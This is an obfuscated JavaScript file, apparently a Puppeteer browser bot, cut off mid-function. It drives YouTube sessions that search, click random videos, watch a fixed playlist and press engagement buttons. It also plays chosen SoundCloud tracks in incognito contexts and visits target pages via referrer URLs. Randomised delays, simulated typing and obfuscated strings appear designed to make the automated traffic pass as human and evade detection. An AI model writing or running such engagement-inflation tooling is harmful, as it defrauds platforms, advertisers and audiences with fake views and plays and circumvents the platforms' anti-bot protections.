function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x798 + -0x243 + -0x555);
    let h = e[f];
    return h;
  }, d(b, c);
}
const Y = b,
  X = d,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1cf * 0x8 + -0x592 * -0x2 + 0x5f * -0x45))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x5 * -0x623 + -0x80 * -0x4a + -0x651), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * 0xb986 + 0x3305 + -0x23 * 0x369 + (-0x190f + -0x45d7 * -0x1 + -0x68 * -0x22) * random()) : await standardWaitForNetIdle(f), await wait(-0x1ef2 + -0x1 * 0x653 + 0x3 * 0x12ef + (-0x1d7c + 0x22a * 0xb + 0x2cbe) * random()), 0x755 * 0x1 + -0xed * -0x23 + -0x27bb;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x229 * 0x11 + -0x19b0 + 0x51f1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x205f * 0x1 + -0x1e43 + 0x3ea3;
}
async function randomWait() {
  return await wait(-0x18dd + -0x589 + 0x31ee + (0x259 * 0x2 + 0x33 * 0x7 + 0xd71) * random()), -0x3a6 * -0x2 + -0x24 * 0xef + -0x1 * -0x1a51;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * -0x100 + 0x1cb6 + 0x2 * -0xedb, 0xa * 0x2b3 + -0x2509 + 0xa12), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xc59c + 0x1 * -0xdada + 0x2 * 0x7fcf) * getRandomInt(-0x141b * -0x1 + 0x13e8 + -0x2801, 0x1118 + 0x409 * -0x2 + -0x901), h)), 0x21d3 + 0x182 + -0x1 * 0x2354;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2282 + -0x1a1c + -0x866;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x2650 + 0x17ff + 0xe52]['split']('\x20');
    for (let k = 0x10a3 * -0x2 + 0x124d + 0xef9; k < i['length']; k += 0x8b * 0x19 + 0x1c90 * -0x1 + 0xb * 0x15d)
      j += i[k] * h[i[k + (-0x1 * 0x6a0 + -0x110b + 0x3 * 0x7e4)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xb7b + -0x1eea * 0x1 + 0x11 * 0x125)['map'](l => Array['from'](l['children']))['flat'](-0x2 * -0x1087 + 0xeca + 0x14b * -0x25)['map'](l => l['childNodes'][-0x17cb + 0xf * 0x273 + -0xcf1 * 0x1]['childNodes'][0x7 * 0x32f + -0x1214 + 0x167 * -0x3]['childNodes'][-0x2 * 0xfc4 + -0x2 * -0x1174 + -0x35f]['childNodes'][-0x3 * 0xc91 + 0x72b * 0x1 + 0x1e88 * 0x1]['childNodes'][-0xad3 * 0x2 + -0x81 * 0x30 + 0x92b * 0x5]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x24b8 + 0x5ba * 0x5 + -0x25d * 0x1a, -0x16b0 + 0x1632 + 0x1406)), await f['click']('#__hookedV' + R(0x14, 's%%d')), await wait(-0x1 * 0xaff + -0x1a3 * -0x1b + 0x1966);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1b8ea + -0x260b * -0x1 + 0x27d3f) * getRandomInt(0x5 * -0x2d1 + 0x1 * -0xf9 + 0xf10, 0x1769 + 0x44 * 0x6b + 0x33d0 * -0x1), h);
  return await wait(i), 0x28 * -0x1f + 0x397 * -0x1 + 0x870;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x547 + -0x1 * 0x2065 + 0x4e * 0x59]['children'][-0x1650 + 0x1 * -0xda9 + -0x23f9 * -0x1]['children'][0x1b7a + -0x545 + -0x1635]['children'][-0x59b * 0x4 + -0x142c + 0x2a98]['children'][-0x14d5 + 0x3 * 0x851 + -0x22 * 0x1f]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x19e7 + -0x35 * -0x73 + 0x219;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x97e + 0x1 * -0x22e9 + 0x19cf + (0x2702 + -0x1643 * -0x1 + 0x3b * -0x109) * random()
  }), await wait(-0x21 * -0x45 + -0xc5b + 0x56a + (-0x15b0 + 0x1f1 + 0x14eb) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x10 * 0x125 + 0x1313 * 0x1 + -0xc1]['childNodes'][-0x1ef7 + -0x47f + 0x2377 * 0x1]['childNodes'][-0x1c3b + 0x101 * 0x3 + 0x1939]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x45b + 0xe * 0x2c6 + -0xaa * 0x41]['childNodes'][-0x10da + 0x1ed3 + -0xdf9]['childNodes'][0x57a * 0x5 + 0x1344 + -0x5 * 0x954]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x14d9 + 0x1f * 0xd3 + -0x191 * 0x3),
          r = -0xf9d * 0x2 + -0x1a64 + -0x5 * -0xb86;
        for (let u = 0x21ef + -0xc * -0x51 + -0x25bb; u < q['length']; u += 0x11 * -0x229 + 0x26a * 0xd + 0x559)
          r += q[u] * k[q[u + (-0x446 + -0x21dc + 0x1 * 0x2623)]];
        return r;
      }(n);
  });
  await wait((-0x11 * 0x5ec + -0x5 * 0x16ff + 0x1123f) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1508d + 0xef * -0x1c + 0x1 * 0x25511) * getRandomInt(-0x2a1 * -0xb + 0x1 * 0x26fc + 0x2 * -0x21f3, 0x1df5 + -0x316 * -0xa + -0x3cc7 * 0x1), h + (-0x7 * 0x4d2 + 0x2 * -0xfd4 + -0x2 * -0x2a77));
  return await wait(i), -0xb97 + -0x222c + -0x2dc4 * -0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x509 + 0x2 * 0x179 + 0x217), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x632 + -0x1fd + 0x13e7 + (0x1d55 + -0x2 * 0x6d3 + -0xbc7) * Math['random']());
    });
  }, -0x35b8 + 0x26c7 + 0x2a49);
  await wait(0x61dfb + 0x261f2 + 0x3ec0d * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x75 * -0x226 + -0x1 * -0x18823 + -0x19921) * getRandomInt(-0x11a * 0x3 + -0x6 * -0x35f + -0x10e8, -0x6c7 + -0x2 * 0xd65 + 0x116 * 0x1f)), clearInterval(h), -0x5aa + 0xfa + 0x4b1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x6ee + 0xeab + 0x3 * -0x733;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x186 * -0x11 + -0x25 + 0x1a0c;
    await randomWait();
  }
  return -0x1 * -0x12fd + -0x1b4e + 0x852;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1f9d + -0x221 + 0x269 * 0xe + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x24d8 + 0xb02 + -0x2fda + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x798 + -0x243 + -0x555);
    let h = e[f];
    if (c['PaYhwh'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x179d + -0x67 * 0x57 + -0x16e * -0x29, r, s, t = 0xb7b + 0x9b8 * 0x4 + -0x325b; s = m['charAt'](t++); ~s && (r = q % (0x1cf * 0x8 + -0x592 * -0x2 + 0x68 * -0x3f) ? r * (0x5 * -0x623 + -0x80 * -0x4a + -0x611) + s : s, q++ % (0x2 * 0xf76 + 0x881 + -0x13 * 0x213)) ? o += String['fromCharCode'](-0x85b + -0x1748 * -0x1 + -0x6f7 * 0x2 & r >> (-(-0x1ef2 + -0x1 * 0x653 + 0x1 * 0x2547) * q & -0xebe + 0x115 * 0xb + 0x2dd)) : 0x755 * 0x1 + -0xed * -0x23 + -0x27bc) {
          s = n['indexOf'](s);
        }
        for (let u = -0x229 * 0x11 + -0x19b0 + 0x3e69, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x205f * 0x1 + -0x1e43 + 0x3eb2))['slice'](-(-0x18dd + -0x589 + 0x1e68));
        }
        return decodeURIComponent(p);
      };
      c['iROiHe'] = i, b = arguments, c['PaYhwh'] = !![];
    }
    const j = e[0x259 * 0x2 + 0x33 * 0x7 + -0x617],
      k = f + j,
      l = b[k];
    return !l ? (h = c['iROiHe'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    const T = c,
      S = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1041 + 0x1a37 * -0x1 + 0x9f6 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j[S(0x13)]();
      let l = 0x13a7 + 0x15f * 0x1 + -0x1506;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x5b3 * 0x1 + -0x1 * -0xf02f + 0x2 * -0x1d5a + getRandomInt(-0x480a + -0x2e1b + -0x5 * -0x2359, -0x5f69 + -0x246e * -0x5 + -0x1e73 * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xfe8 + -0x319 + 0x12a * -0xb), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1bd5 + 0x12a7 + 0x154 * -0x23;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x10 * 0x191 + 0x649 + -0xfd * -0x13, 0x5 * -0x2b5 + 0x24fa + -0x173f)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r[T(0xa)](), i()) : (await new Promise(w => setTimeout(w, -0x21 * -0xa6 + -0x2366 * -0x1 + -0x30fc + floor((0x13c5 + -0x1 * 0x1043 + 0x66) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x8 * 0x116628ef + -0xfad04df2 + 0x20601956a),
          -0x132bc * 0xd0 + -0x9820 * 0x6b + 0x3ef8e * 0x70,
          -0x14 * 0x332 + 0x4115 * 0x1 + -0x7ed3 * -0x1,
          -0x12c + 0xbc7 + -0xa1b
        ], y = [
          -0x2 * 0x1223 + -0x1bc1 + 0x401f,
          0x7 * -0x41c + -0x6f * -0x45 + 0x9 * -0x1f,
          -0x2e * 0xa7 + -0x11c7 + 0x2fd1,
          -0x84d * 0x1 + 0x636 + 0x217
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * 0x11af + 0x1 * 0x32b + 0x6f3 * -0x3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xf54 * 0x1 + 0x259f * 0x1 + -0x34f3; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x8a0 + 0xf0b + -0x66b) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const U = d;
              J ? (A[0xed2 * 0x1 + -0x3 * -0x899 + -0x289d] = A[0x2f4 * -0x3 + 0x6d * -0x31 + -0x1dc9 * -0x1] = A[0x1a * 0x55 + -0x17 * -0xb0 + -0x1871] = A[0x1ccd + 0x2231 * -0x1 + 0x566] = A[0x1 * -0x1b87 + 0x1cef + 0x3 * -0x77] = A[-0x223e * -0x1 + 0x18ba + -0x3af4] = A[-0x3 * -0x722 + -0x8 * -0x95 + -0x1a09] = A[0x7b + -0x5 * -0x277 + -0xcc8] = A[-0x173 * 0x7 + -0x1 * 0x1ea + 0x1 * 0xc16] = A[-0x21fb + 0x1b10 * -0x1 + 0x3d13] = A[0x2214 + -0x2 * -0x167 + -0x24d9] = A[-0x1fab * -0x1 + -0x30b * 0x1 + -0x1c96] = A[0xa49 * -0x2 + -0x171a * 0x1 + 0x2bb7] = A[0x2 * -0x7cd + -0x6b5 + 0x165b] = A[-0xb * 0x10f + -0x2 * 0x209 + 0xfc4] = A[-0x137d + 0x1602 + -0x277] = A[0xe3 + -0x516 + 0x442] = 0x19ab * 0x1 + -0x1f61 * -0x1 + -0x390c, this['blocks'] = A) : this['blocks'] = [
                -0x1 * -0x932 + -0x1 * 0x2476 + 0x1b44,
                0x9 * -0x385 + -0xae2 + 0x5 * 0x883,
                0x2 * -0xa91 + -0x16a0 + 0x2bc2,
                -0x167 * -0x1 + -0x2b * -0x62 + 0x11dd * -0x1,
                0x42 * -0x47 + -0x1269 + -0x27 * -0xf1,
                -0x1a28 + 0x4 * -0x883 + -0xf0d * -0x4,
                -0x2327 + -0x1f1e + 0x75 * 0x91,
                0x1 * 0x92 + -0x3c9 + -0x337 * -0x1,
                -0x1 * 0x1b2f + 0x1752 + -0x2b * -0x17,
                0x1 * -0x201b + 0x17de + 0x83d,
                0x2227 * 0x1 + -0x14a3 + -0xd84,
                -0x71f * 0x2 + -0x13ec + -0x222a * -0x1,
                -0x2 * 0x1297 + -0xe6f + -0x339d * -0x1,
                0x7 * 0x1f4 + 0x2 * 0x793 + -0x1cd2,
                0x8db * 0x4 + 0x17d0 + -0x3b3c,
                0x179c + -0xed * -0x15 + -0x2b0d * 0x1,
                -0x1 * 0x547 + -0x210f + 0x2656
              ], this['h0'] = -0x868c0c63 + 0x5c082cfb + 0x91c90269, this['h1'] = -0x9 * 0x2ccc437 + 0x4360dc6 * -0x10 + -0x1036b43 * -0x148, this['h2'] = 0x275 * -0x4611c6 + -0xe41 * -0x1027fd + 0x5e9a8b3f, this['h3'] = -0xe08cd + -0xd * -0x2734d9e + -0xf9a93c3, this['h4'] = -0xed3c1070 + -0x19d3de65 * -0x1 + 0x259 * 0xad7673, this['block'] = this['start'] = this[U(0x12)] = this['hBytes'] = -0x1473 + -0x1610 * -0x1 + -0x19d * 0x1, this['finalized'] = this['hashed'] = -0x39b + 0x1ecd + -0x76 * 0x3b, this['first'] = 0x11f3 * -0x2 + -0x227c + -0x1 * -0x4663;
            }
            ['update'](J) {
              const V = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1701 + -0x6c0 + 0x13 * -0xdb, O = J['length'] || -0xc35 + 0x1 * 0x1246 + -0x611, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x987 + 0x1 * 0x119b + 0xb * -0xbc, P[0x21ea + 0x5 * -0x226 + -0x1 * 0x172c] = this[V(0xe)], P[0x513 * 0x3 + -0x91b + -0x136 * 0x5] = P[0x9 * -0xeb + 0x29 * 0xbf + 0x771 * -0x3] = P[0x4 * 0x13e + 0x11e + -0x614] = P[-0x311 + -0x21ec + -0x25 * -0x100] = P[-0x1038 + -0x18c9 + -0x1 * -0x2905] = P[-0x1368 + 0xa37 + 0x936] = P[0xfc2 + -0x16ba + 0x6fe] = P[-0x1 * -0x1741 + 0x18 * -0x3 + -0x16f2] = P[0xd * 0x1eb + 0x1946 + -0x322d] = P[0x2e3 * -0xd + -0xaf9 + -0x9b5 * -0x5] = P[0x7 * -0x3c7 + -0x1808 + 0x3283] = P[-0x2563 + -0x1249 * -0x1 + -0x1 * -0x1325] = P[0x3e * -0x28 + 0x91 + -0x92b * -0x1] = P[0x160 + 0x21f7 + 0x2 * -0x11a5] = P[0x1819 + -0xfa7 + -0x864] = P[0x1 * -0xce5 + 0xfa * 0x7 + -0x2 * -0x30f] = -0x227c + 0x2653 + 0x1 * -0x3d7), K) {
                    for (N = this['start']; M < O && N < -0x787 * -0x5 + 0x57a + -0x2add; ++M)
                      P[N >> 0x1 * 0x71f + 0x21 * -0x86 + 0xa29] |= J[M] << y[0x1 * 0x1d6e + 0xcd9 * 0x2 + -0x371d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2009 + 0x24ae + -0x177 * 0x3; ++M)
                      (L = J['charCodeAt'](M)) < 0x977 * 0x1 + -0x1 * -0x373 + -0xc6a ? P[N >> -0x14f * -0x3 + 0x9c3 + -0xdae] |= L << y[-0x60b + -0x21bd + 0x27cb & N++] : L < -0xa51 + -0x1736 + 0x2987 ? (P[N >> 0xb99 * 0x3 + 0x1be9 + 0x2 * -0x1f59] |= (-0x79 * -0x37 + 0x4b5 * -0x3 + 0x164 * -0x8 | L >> -0x141f * 0x1 + -0x1 * -0x1913 + -0x4ee) << y[-0x4f * -0x7b + -0xca * -0x27 + -0x44b8 & N++], P[N >> -0x8 * -0x287 + 0x1 * -0xb3 + 0x2d * -0x6f] |= (-0xa0b * -0x1 + 0x7a * -0x14 + -0x3 | 0x2ee + -0x18d * -0x4 + -0x8e3 & L) << y[0x1cec + 0x1118 + 0x1 * -0x2e01 & N++]) : L < 0x17400 + 0x5e9f + 0x1 * -0xfa9f || L >= 0x68a8 + 0x6403 + 0x1355 ? (P[N >> 0x1e5c + -0x403 * -0x3 + -0x2a63] |= (0x363 * -0x6 + -0x16ca + 0x2bfc | L >> 0x2 * 0x479 + 0xb3 * 0x25 + -0x3dd * 0x9) << y[-0x40d + 0xe78 + -0x6f * 0x18 & N++], P[N >> 0x1f * 0x3d + 0x43 * 0x41 + 0x2 * -0xc32] |= (-0xe9 * -0x15 + -0x2494 + 0x11f7 | L >> -0x91d + 0x1 * 0x20d6 + -0x17b3 & 0x260b * -0x1 + 0x5 * -0x217 + 0x30bd) << y[-0x25b + 0x3f0 + -0x192 & N++], P[N >> 0x1868 + -0x2578 + -0x1de * -0x7] |= (-0x1 * 0x1b0b + 0x12ef + 0x89c | 0xe40 + 0x6d5 * -0x1 + -0x72c & L) << y[-0x1cb5 + 0x1 * -0xa1c + 0x26d4 & N++]) : (L = 0x1f49d + 0x9c20 + -0x190bd + ((0x3 * -0x79a + 0x6b * -0x17 + 0x246a & L) << -0x62b + 0x121 * -0x17 + 0x202c | -0x5 * 0x8f + 0x335 * 0xc + -0x1fb2 & J['charCodeAt'](++M)), P[N >> -0x6a * -0x2 + 0x237 + 0x6f * -0x7] |= (-0x8ae + 0x19 * 0x10a + -0x105c | L >> 0x2 * -0x1001 + -0x18f4 + 0x3908) << y[-0x1 * -0xee3 + 0x22e5 + 0x3 * -0x1097 & N++], P[N >> 0x2 * -0x102 + 0xc06 * 0x2 + 0x2 * -0xb03] |= (0x11a2 * 0x1 + 0x38b * -0x5 + 0x95 * 0x1 | L >> -0xb4a + -0x879 + 0x13cf & -0x1de1 + -0x20c0 + 0x3ee0) << y[-0x29 * 0x41 + 0x2652 + -0x1be6 & N++], P[N >> -0x1fb8 + -0x1 * -0x472 + 0x1b48] |= (-0xfeb + -0x1762 + 0x27cd * 0x1 | L >> 0x1 * 0x57d + 0x1 * -0x2611 + 0x209a & -0x2676 + 0xd4 + 0x25e1) << y[-0x4d * 0x2e + 0x34f + 0x545 * 0x2 & N++], P[N >> 0x1 * 0x182f + 0x1247 + -0x2a74] |= (-0x5 * -0x1 + 0x1ecd + -0xf29 * 0x2 | 0x89 * -0x22 + -0x22e8 + 0x3559 & L) << y[0x1a6a + -0x996 * 0x3 + 0x1 * 0x25b & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x4a9 * -0x4 + 0x1 * 0x1cfd + 0x5 * -0x205 ? (this['block'] = P[0x12df * -0x2 + -0xfdf * 0x1 + 0x35ad], this['start'] = N - (-0x1570 + -0x5cc + 0x1b7c * 0x1), this['hash'](), this['hashed'] = -0x1c5f * 0x1 + 0x1aff * -0x1 + 0x375f) : this['start'] = N;
                }
                return this['bytes'] > 0x1507aeb8 + 0xa869dde0 + 0x428e7367 && (this['hBytes'] += this['bytes'] / (-0x17e80036c + -0xa840ef94 + 0x326c0f3 * 0x100) << -0x1f07 + -0x14bf + 0x2 * 0x19e3, this['bytes'] = this['bytes'] % (-0x371f634c + -0xd28 * 0x188a74 + 0xe * 0x2d48ec1a)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x5 * -0x165 + 0x1474 + -0x4e * 0x5a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x104e + -0x1898 + -0x85a * -0x1] = this['block'], J[K >> 0x260e + -0x5f * -0x3b + -0x3bf1] |= x[0x43a * -0x2 + 0xcd * 0x17 + -0x7 * 0x16c & K], this['block'] = J[0x5 * 0x69d + 0x1f9 * -0xf + -0x36a], K >= -0x2 * -0xa36 + -0x1f22 + 0x2 * 0x577 && (this['hashed'] || this['hash'](), J[-0xc87 + 0x1dd1 + -0x114a] = this['block'], J[-0x15 * 0x19b + -0xd3 + 0x67 * 0x56] = J[0x857 + -0x13d5 * -0x1 + 0x1c2b * -0x1] = J[0x91 * 0x36 + -0x1d0 + -0x2 * 0xe62] = J[-0x1 * -0x1529 + 0xe30 * 0x1 + -0x2356] = J[0x25c1 + -0xbf9 + 0x44 * -0x61] = J[0x1e67 * 0x1 + 0x1d89 * -0x1 + 0x1f * -0x7] = J[0x149f + 0x1748 + -0x2be1] = J[0x18f9 + -0x534 * 0x4 + -0x1 * 0x422] = J[-0x1 * -0x1021 + 0x1 * -0x18c7 + 0x1 * 0x8ae] = J[0x6e3 * -0x1 + 0xf91 + 0x1 * -0x8a5] = J[-0x2051 + 0x1b25 + -0x17 * -0x3a] = J[0x2704 + 0x6e * 0x4f + 0x48eb * -0x1] = J[-0x17 * 0x109 + 0x19de + -0x203] = J[0x23e * 0x2 + 0x1 * -0x1d25 + -0x1 * -0x18b6] = J[0x239 * 0x3 + -0x141 * 0x3 + -0x2da] = J[0x244f + -0x3bc + -0x2084] = 0x5b * -0xa + -0x2c6 * 0x1 + -0xa2 * -0xa), J[-0x519 * 0x7 + 0x205a + 0x363] = this['hBytes'] << -0x4e8 + -0x94b * 0x3 + 0x20cc | this['bytes'] >>> 0x12b0 * -0x1 + -0x1 * 0x2149 + -0x2 * -0x1a0b, J[-0x227d + 0x265c + -0x3d0] = this['bytes'] << 0x2 * -0x1082 + 0x53b + 0xde6 * 0x2, this['hash']();
              }
            }
            ['hash']() {
